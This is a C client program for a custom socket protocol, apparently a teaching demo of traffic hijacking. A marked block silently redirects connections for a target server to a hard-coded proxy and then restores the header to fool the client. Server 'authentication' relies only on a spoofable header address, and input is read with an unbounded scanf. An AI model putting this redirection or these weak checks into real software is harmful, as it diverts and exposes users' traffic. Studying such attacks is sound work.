#include "sockcom.h"

int main(int argc, const char * argv[]) {
	
	int sockfd;
	struct sockaddr_in server;
	struct sockaddr_in src;
	socklen_t len_src = sizeof(src);
	struct MyHeader sendHead;
	struct MyHeader recvHead;

	struct hostent *hp, *gethostbyname();
	
	uint32_t frame_len, buf_len, msg_len, count;
	char frame[MAXBUF];
	char buf[MAXBUF-HEADLEN-1];
	char msg[MAXBUF-HEADLEN-1];
	
	if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ){
		printf("Client socket() error.\n");
		return -1;
	}

	server.sin_family = AF_INET;
	// get target server name and port from cmd line.
//	if ( (hp = gethostbyname(argv[1])) == NULL) {
//		fprintf(stderr, "%s: unknown host\n", argv[1]);
//		return -1;
//	}
//	bcopy((char*) hp->h_addr, (char*) &server.sin_addr.s_addr, hp->h_length);

	// get server addr via IP.
	if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
		printf("inet_pton error occurred\n");
		return -1;
	}
	server.sin_port = htons(atoi(argv[2]));
	
	//fill the header, hijacking code happens after this will modify it.
	sendHead.dst = server;

	//===========the hijacked code checks the target server address
	struct sockaddr_in target, proxy;
	target.sin_family = AF_INET;
	inet_aton(argv[1], &(target.sin_addr));
	target.sin_port = htons(TARGET_PORT); 
	proxy.sin_family = AF_INET;
	inet_aton("192.168.1.5", &(proxy.sin_addr));//hard coded, hijacking always know where to redirect
	proxy.sin_port = htons(PROXY_PORT); 

	if(isEqual_sockaddr_in(sendHead.dst, target)) { //if match will do malicious redirecting.
		inet_aton("192.168.1.5", &(sendHead.dst.sin_addr));
		sendHead.dst.sin_port = htons(PROXY_PORT);// redirect to the proxy server.
		printf("[Hijacking]: redirecting client to [%s:%u].\n",inet_ntoa(sendHead.dst.sin_addr), ntohs(sendHead.dst.sin_port));
		//the client has no aware the server address has been comprimised.
		if(connect(sockfd, (struct sockaddr*) &sendHead.dst, sizeof(sendHead.dst)) < 0){
			printf("Client connect() to server error.\n");
			return -1;
		}
		inet_aton(argv[1], &(sendHead.dst.sin_addr));
		sendHead.dst.sin_port = htons(TARGET_PORT);// change back to cheat client
	} else {// not targeted server addr, connect normally.	
		if(connect(sockfd, (struct sockaddr*) &server, sizeof(server)) < 0){
			printf("Client connect() to server error.\n");
			return -1;
		}
	}
	
	// get the local address, client won't bind port.	
	if( getsockname(sockfd, (struct sockaddr*) &src, &len_src) == -1) {
	       printf("Client getsockname() error.\n");
	       printf("error num:%d\n",errno);
	       return -1;
	}
	//fill the header, src part
	sendHead.src = src;
	
	for(;;) {
		bzero(msg,sizeof(msg));
		printf("Enter message to be sent:");
		scanf("%s", msg);//default seperator is space
		//scanf("%[^\n]s",msg);//scan until hit \n to stop
		msg_len = strlen(msg);	
		if(msg_len== 0)	
			continue;
		//build frame and send
		bzero(frame,sizeof(frame));
		frame_len = pack_build(frame, &sendHead, msg, msg_len);

		if(send(sockfd, frame, frame_len, 0) < 0){// DONOT use strlen(frame), in_addr has \0 inside, will seperate string.
			printf("Client send() error. \n");
			break;
		}
		printf("<< Send request from [%s:%u] ", inet_ntoa(sendHead.src.sin_addr), ntohs(sendHead.src.sin_port));
		printf("to [%s:%u], ", inet_ntoa(sendHead.dst.sin_addr), ntohs(sendHead.dst.sin_port));
		printf("Size: %u, Content: %s\n", msg_len, msg);

		/*********** Here Starts the Recv Process*********/
		bzero(frame,sizeof(frame));
		if( (count = recv(sockfd, frame, sizeof(frame) , 0)) < 0){
			printf("recv failed");
			break;
		}
		
		// now client will parse the package
		bzero(buf,sizeof(buf));
		buf_len = pack_parse(frame, count, &recvHead, buf);
		
		printf(">> Reply from [%s:%u]\n", inet_ntoa(recvHead.src.sin_addr), ntohs(recvHead.src.sin_port));
		
		if (isEqual_sockaddr_in(recvHead.src, server)) { // authentication correct
			printf(">> Authentication Server Pass.\n");
		}else {
			printf(">> Authentication Server Failure.\n");
			return -1;
		}
				
		printf(">> Size: %u, Content: %s\n\n",buf_len, buf);
		
	}
	printf("EOF...disconnect\n");
	close(sockfd);
		
	return 0;
}
